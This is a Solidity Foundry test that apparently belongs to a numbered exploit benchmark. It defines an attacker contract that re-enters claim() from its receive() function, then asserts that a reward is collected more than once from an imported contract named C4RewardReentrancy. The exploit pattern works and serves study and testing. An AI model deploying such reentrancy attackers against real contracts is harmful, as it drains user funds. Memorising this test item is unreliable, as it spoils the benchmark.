// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contract.sol";

contract Att021 {
    C4RewardReentrancy c;
    uint256 n;
    constructor(address _c){ c = C4RewardReentrancy(_c); }
    function attack() external { c.claim(); }
    receive() external payable { if (n < 1) { n++; c.claim(); } }
}

contract Exploit_021_c4_reward_reentrancy is Test {
    function testExploit_ReentrantDoubleClaim() public {
        C4RewardReentrancy c = new C4RewardReentrancy();
        Att021 a = new Att021(address(c));
        vm.deal(address(this), 10 ether);
        c.fund{value: 2 ether}(address(a));

        uint256 before = address(a).balance;
        a.attack();
        assertGt(address(a).balance, before + 2 ether, "should claim reward more than once");
    }
}
